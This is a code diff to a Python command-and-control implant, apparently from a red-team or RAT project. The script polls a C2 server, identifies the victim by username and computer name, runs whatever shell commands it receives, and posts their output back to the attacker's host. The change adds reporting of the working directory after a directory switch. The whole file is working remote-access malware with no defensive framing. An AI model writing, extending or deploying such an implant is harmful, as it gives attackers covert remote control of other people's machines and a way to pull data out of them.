@@ -1,21 +1,21 @@
 from time import time, sleep
 from requests import get, post, exceptions
 from subprocess import run, PIPE, STDOUT
-from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
-from os import getenv, chdir
+from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+
+from os import getenv, chdir, getcwd
 
 client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
           str(time()))
 
 # client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time())
 
-def post_to_server(message, response_path=RESPONSE_PATH):
+def post_to_server(message, response_path=RESPONSE):
     try:
         post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
              headers=HEADER, proxies=PROXY)
     except exceptions.RequestException:
         return
-
 
 while True:
     try:
@@ -23,7 +23,6 @@ while True:
 
         if response.status_code == 404:
             raise exceptions.RequestException
-
     except exceptions.RequestException:
         sleep(DELAY)
         continue
@@ -42,6 +41,8 @@ while True:
             post_to_server(f"You do not have permissions to access {directory}.\n")
         except OSError:
             post_to_server("There was an operating system error on the client.\n")
+        else:
+            post_to_server(getcwd(), CWD_RESPONSE)
 
     else:
         command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
